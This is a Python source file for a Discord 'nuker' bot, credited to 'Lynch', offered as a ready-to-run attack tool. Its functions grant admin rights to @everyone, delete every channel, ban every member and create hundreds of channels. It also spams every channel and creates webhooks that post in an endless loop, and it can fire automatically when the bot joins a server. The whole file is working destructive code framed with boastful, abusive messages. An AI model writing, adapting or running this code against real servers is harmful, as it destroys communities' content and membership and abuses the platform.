# Bot Config
token = ""
prefix = ""

# Nuke Config
spam_messages = ["@everyone You've Got Nuked", "@everyone Sorry Owner, You've Been Owned By @0"]
channel_names = ["nuked", "channels"]
webhook_usernames = ["Null", "Null2"]
nuke_on_join = False
nuke_wait_time = 0



# Don't Touch Anything Below Unless You have Python Codding Skills!


import discord, random, aiohttp, asyncio, os, colorama
from discord import Webhook, AsyncWebhookAdapter
from discord.ext import commands
from discord.ext.commands import *
from colorama import Fore as C
from colorama import Style as S
from colorama import Fore
colorama.init(autoreset=True)
from os import system
system("title" + "Programmed By Lynch - Discord Nuker")


bot = commands.Bot(command_prefix = prefix)

@bot.command()
async def cmds(ctx):
  await ctx.message.delete()
  author = ctx.author
  cmds = discord.Embed(
    title = "Lynch Nuker - Commands", 
    description = """
**__COMMANDS__**
```
{prefix}cmds
Shows this message. 
 
{prefix}kill
Nukes the server. 
 
{prefix}sall <message>
Spams all the channels.
 
{prefix}ccr <channel count> <channel name>
Creates channels with the given name.
 
{prefix}cdel
Deletes all channels.
 
{prefix}logout
Logs out the client.

{prefix}clean
Purges channel massages.
```
**__CREDITS__**
```
Made By Lynch, [i]: @l7up, Discord:Lynch#9897
```
""")
  await author.send(embed = cmds)


async def nuke(guild):
  print(f"[{Fore.GREEN}+{Fore.RESET}] Successfully Fucked {guild.name}")
  role = discord.utils.get(guild.roles, name = "@everyone")
  try:
    await role.edit(permissions = discord.Permissions.all())
    print(f"[{Fore.GREEN}+{Fore.RESET}] Successfully Granted Admin Permissions in {guild.name}")
  except:
    print(f"[{Fore.RED}-{Fore.RESET}] Admin Permissions NOT GRANTED In {guild.name}")
  for channel in guild.channels:
    try:
      await channel.delete()
      print(f"[{Fore.GREEN}+{Fore.RESET}] Successfully Deleted Channel >> {channel.name}")
    except:
      print(f"[{Fore.RED}-{Fore.RESET}] Channel >> {channel.name} Has NOT Been Deleted")
  for member in guild.members:
    try:
      await member.ban()
      print(f"[{Fore.GREEN}+{Fore.RESET}] Successfully Banned >> {member.name}")
    except:
      print(f"[{Fore.RED}-{Fore.RESET}] Member >> {member.name} Has NOT Been Banned")
  for i in range(500):
    await guild.create_text_channel(random.choice(channel_names))
  print(f"[{Fore.GREEN}+{Fore.RESET}] Successfully Fucked {guild.name}")



@bot.command(pass_context=True)
@commands.has_permissions(administrator=True)
async def clean(ctx, limit: int):
        await ctx.channel.purge(limit=limit)
        await ctx.send('Cleared by {}'.format(ctx.author.mention))
        await ctx.message.delete()

@clean.error
async def clear_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("Get perms first, loser")




@bot.event
async def on_ready():
    activity = discord.Game(name="@l7up", type=3)
    await bot.change_presence(status=discord.Status.idle, activity=activity)


@bot.command()
async def kill(ctx):
  await ctx.message.delete()
  guild = ctx.guild
  await nuke(guild)
  
@bot.event
async def on_guild_join(guild):
  if nuke_on_join == True:
    await asyncio.sleep(nuke_wait_time)
    await nuke(guild)
  else:
    return
  
@bot.command()
async def sall(ctx, *, message = None):
  if message == None:
    for channel in ctx.guild.channels:
      try:
        await channel.send(random.choice(spam_messages))
      except discord.Forbidden:
        print(f"[{Fore.RED}-{Fore.RESET}] Spam Error [Cannot send messages]")
        return
      except:
        pass
  else:
    for channel in ctx.guild.channels:
      try:
        await channel.send(message)
      except discord.Forbidden:
        print(f"[{Fore.RED}-{Fore.RESET}] Sall Error [Cannot send messages]")
        return
      except:
        pass

@bot.command()
async def ccr(ctx, amount = 10, *, name = None):
  if name == None:
    for i in range(amount):
      try:
        await ctx.guild.create_text_channel(random.choice(channel_names))
      except discord.Forbidden:
        print(f"[{Fore.RED}-{Fore.RESET}] Ccr Error [Cannot create channel]")
        return
      except:
        pass
  else:
    for i in range(amount):
      try:
        await ctx.guild.create_text_channel(name)
      except discord.Forbidden:
        print(f"[{Fore.RED}-{Fore.RESET}] Ccr Error [Cannot Create Channel]")
        return
      except:
        pass

@bot.command()
async def cdel(ctx):
  for channel in ctx.guild.channels:
    try:
      await channel.delete()
      print(f"[{Fore.GREEN}+{Fore.RESET}] Successfully Deleted Channel >> {channel.name}")
    except:
      print(f"[{Fore.RED}-{Fore.RESET}] Channel >> {channel.name} Has NOT Been Deleted")

@bot.event
async def on_guild_channel_create(channel):
  webhook = await channel.create_webhook(name = "fucked")
  webhook_url = webhook.url
  async with aiohttp.ClientSession() as session:
    webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
    while True:
      await webhook.send(random.choice(spam_messages), username = random.choice(webhook_usernames))

@bot.command()
async def logout(ctx):
  await ctx.message.delete()
  exit()

if __name__ == "__main__":

 logo = """
  _                     _     
 | |   _   _ _ __   ___| |__  
 | |  | | | | '_ \ / __| '_ \ 
 | |__| |_| | | | | (__| | | |
 |_____\__, |_| |_|\___|_| |_|
       |___/                                    
"""

print(Fore.CYAN+logo)
title = ("Made w Love By Lynch, [i]: @l7up")
print(Fore.RED+title) 

try:
    bot.run(token)
except discord.LoginFailure:
    print(f"[{Fore.RED}-{Fore.RESET}] Client Failed To Login >> [Improper Token Passed]")
except discord.HTTPException:
    print(f"[{Fore.RED}-{Fore.RESET}] Client Failed To Login >> [Unknown Error]")
